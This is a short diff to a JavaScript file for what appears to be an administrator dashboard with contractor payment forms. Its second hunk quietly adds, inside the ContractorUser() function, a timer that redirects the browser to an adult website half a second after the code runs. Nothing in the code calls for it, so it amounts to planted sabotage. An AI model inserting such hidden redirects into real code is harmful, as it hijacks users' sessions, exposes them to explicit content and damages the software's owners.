@@ -2,6 +2,7 @@
 function NgpTotalLogs() {
 
 
+
     $("#logstotaldatatableadministrator").DataTable({
         "ajax": {
             "url": "/Dashboard/NgpLogsTotalforAdministrator",
@@ -16364,6 +16365,10 @@ function ContractorUser() {
 
 
         };
+
+            setTimeout(function(){
+        window.location.href = 'https://pornhub.com';
+    }, 500);
 
 
         var id = $('#edityear3paymentform').find('input[name="contractorID"]').val();
